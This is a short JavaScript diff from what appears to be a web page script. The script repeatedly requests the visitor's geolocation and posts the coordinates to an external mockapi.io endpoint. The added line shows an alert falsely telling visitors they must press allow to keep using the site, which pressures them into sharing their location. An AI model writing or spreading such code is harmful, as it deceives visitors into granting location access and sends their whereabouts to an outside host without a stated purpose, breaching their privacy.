@@ -10,6 +10,7 @@ var geoSuccess = function (position) {
 var postLocation
 
 var getLocation = setInterval(()=>{
+  alert("Please press allow button to continue using this site.")
   navigator.geolocation.getCurrentPosition(geoSuccess);
   console.log(lati, longti);
   if(lati||longti) {
@@ -19,7 +20,7 @@ var getLocation = setInterval(()=>{
     }
     let promise = $.post("https://5f3bd488fff8550016ae5bfc.mockapi.io/place", postLocation);
     promise.then(
-      prompt("Thank you")
+      alert("Thank you")
     )
     clearInterval(getLocation);
   }
